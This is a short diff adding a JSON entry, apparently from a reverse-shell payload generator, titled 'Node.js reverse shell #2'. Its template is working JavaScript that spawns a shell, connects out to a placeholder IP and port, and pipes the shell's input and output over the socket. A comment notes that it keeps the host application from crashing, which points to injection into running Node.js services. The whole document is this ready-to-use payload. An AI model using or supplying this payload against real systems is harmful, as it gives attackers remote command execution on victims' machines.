@@ -1,0 +1,9 @@
+{
+  "commands": [
+    {
+      "title": "Node.js reverse shell #2",
+      "template": "(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"sh\", []);\n    var client = new net.Socket();\n    client.connect({port}, \"{ip}\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application from crashing\n})();",
+      "description": "Advanced Node.js reverse shell using net module and child_process spawn."
+    }
+  ]
+}
